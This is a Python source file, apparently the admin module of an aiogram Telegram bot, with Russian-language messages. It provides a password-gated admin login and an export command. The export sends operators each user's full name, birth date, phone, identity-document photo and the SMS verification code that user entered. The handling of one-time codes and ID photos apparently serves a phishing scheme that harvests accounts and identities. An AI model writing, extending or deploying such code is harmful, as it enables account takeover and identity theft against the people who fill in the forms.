from aiogram import Router, types, F, Bot
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from database.db import add_admin, is_admin
from config import ADMIN_PASSWORD
import sqlite3

router = Router()

class AdminAuth(StatesGroup):
    waiting_password = State()

@router.message(Command("apanel"))
async def admin_panel_command(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    
    # Проверяем, авторизован ли уже пользователь
    if is_admin(user_id):
        await message.answer(
            "✅ Вы уже авторизованы как администратор.\n\n"
            "Вам будут приходить уведомления о новых анкетах и о кодах, которые ввел пользователь."
        )
        return
    
    # Очищаем любое текущее состояние формы
    await state.clear()
    
    # Запрашиваем пароль
    await state.set_state(AdminAuth.waiting_password)
    await message.answer("🔐 Введите пароль для получения администраторского функционала:")

@router.message(AdminAuth.waiting_password)
async def process_admin_password(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    username = message.from_user.username or "Без username"
    entered_password = message.text.strip()
    
    # Удаляем сообщение с паролем для безопасности
    try:
        await message.delete()
    except:
        pass
    
    # Проверяем пароль
    if entered_password == ADMIN_PASSWORD:
        # Добавляем пользователя в список администраторов
        add_admin(user_id, username)
        
        await message.answer(
            "✅ <b>Авторизация успешна!</b>\n\n"
            "Вы теперь администратор. Вам будут отправлены уведомления о новых анкетах и введеных кодах."
        )
        await state.clear()
    else:
        await message.answer(
            "❌ Неправильный пароль. Обратитесь к техническому администратору для получения доступа."
        )
        await state.clear()

@router.message(Command("export"))
async def export_all_forms(message: types.Message, bot: Bot):
    """Выгрузка всех анкет из БД для администратора"""
    user_id = message.from_user.id
    
    # Проверяем, является ли пользователь администратором
    if not is_admin(user_id):
        await message.answer("❌ У вас нет прав для выполнения этой команды.")
        return
    
    try:
        conn = sqlite3.connect("bot_database.db")
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT id, user_id, username, full_name, age, city, phone, email, 
                   document_photo, sms_code, code_verified, created_at
            FROM user_forms
            ORDER BY created_at DESC
        """)
        
        forms = cursor.fetchall()
        conn.close()
        
        if not forms:
            await message.answer("📋 База данных пуста. Анкет пока нет.")
            return
        
        await message.answer(f"📊 Всего анкет в базе: {len(forms)}\n\nНачинаю отправку...")
        
        for idx, form in enumerate(forms, 1):
            form_id, user_id_form, username, full_name, age, city, phone, email, \
            document_photo, sms_code, code_verified, created_at = form
            
            # Формируем текст анкеты
            status = "✅ Подтвержден" if code_verified == 1 else ("❌ Отклонен" if sms_code else "⏳ Ожидает кода")
            
            form_text = (
                f"📋 <b>Анкета #{form_id}</b>\n"
                f"Дата создания: {created_at}\n\n"
                f"👤 User ID: <code>{user_id_form}</code>\n"
                f"📱 Username: @{username}\n\n"
                f"<b>Данные анкеты:</b>\n"
                f"ФИО: {full_name}\n"
                f"Дата рождения: {age}\n"
                f"Город: {city}\n"
                f"Телефон: {phone}\n"
                f"Площадь жилья: {email}\n\n"
            )
            
            if sms_code:
                form_text += f"🔐 <b>Введенный код:</b> <code>{sms_code}</code>\n"
            else:
                form_text += "🔐 <b>Код:</b> Еще не введен\n"
            
            form_text += f"📊 <b>Статус:</b> {status}"
            
            
            try:
                if document_photo:
                    await bot.send_photo(
                        chat_id=message.chat.id,
                        photo=document_photo,
                        caption=form_text
                    )
                else:
                    await message.answer(form_text)
            except Exception as e:
                await message.answer(f"❌ Ошибка при отправке анкеты #{form_id}: {str(e)}")
            
            
            if idx % 10 == 0:
                await message.answer(f"⏳ Отправлено {idx}/{len(forms)} анкет...")
        
        await message.answer(f"✅ <b>Выгрузка завершена!</b>\n\nОтправлено анкет: {len(forms)}")
        
    except Exception as e:
        await message.answer(f"❌ Ошибка при выгрузке анкет: {str(e)}")